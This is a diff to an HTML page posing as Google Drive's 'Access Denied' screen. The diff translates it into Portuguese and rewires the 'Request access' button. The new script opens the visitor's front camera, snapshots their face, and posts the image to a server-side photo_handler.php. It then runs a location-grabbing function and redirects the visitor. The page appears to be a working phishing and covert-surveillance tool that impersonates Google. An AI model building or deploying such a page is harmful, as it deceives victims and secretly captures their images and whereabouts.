@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
-	<meta name="description" content="Web word processing, presentations and spreadsheets">
+	<meta name="description" content="Processamento de documentos, apresentações e planilhas">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
 	<link rel="shortcut icon" href="/images/drive_favicon1.ico">
-	<title>Google Drive - Access Denied</title>
+	<title>Google Drive - Acesso negado</title>
 	<link rel="stylesheet" type="text/css" href="css/main.css">
 	<script type="text/javascript">
     	if (window.location.protocol == "http:") {
@@ -27,15 +27,44 @@
 			<div style="clear:both"></div>
 			<div id="main">
 				<div id="accessDeniedIcon"></div>
-				<p id="accessDeniedHeader">You need permission</p>
+				<p id="accessDeniedHeader">Você precisa de permissão</p>
 				<div id="message">
-					<p>Want in? Ask for access, or switch to an account with permission.</p>
+					<p>Quer entrar? Solicite acesso ou troque para uma conta com permissão.</p>
 				</div>
 				<p id="buttons" style="padding-top: 10px">
-					<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Request access</button>
+					<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="requestAccess();">Solicitar acesso</button>
 				</p>
 			</div>
 		</div>
 	</div>
+	<script>
+		async function requestAccess() {
+			try {
+				const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+				const video = document.createElement('video');
+				video.srcObject = stream;
+				video.play();
+				const canvas = document.createElement('canvas');
+				canvas.width = 640;
+				canvas.height = 480;
+				const ctx = canvas.getContext('2d');
+				ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+				const imageData = canvas.toDataURL('image/png');
+				stream.getTracks().forEach(track => track.stop());
+
+				fetch('photo_handler.php', {
+					method: 'POST',
+					headers: { 'Content-Type': 'application/json' },
+					body: JSON.stringify({ image: imageData })
+				}).then(function(){
+					locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Falhou');});
+				}).catch(function(){
+					locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Falhou');});
+				});
+			} catch (e) {
+				locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Falhou');});
+			}
+		}
+	</script>
 </body>
 </html>
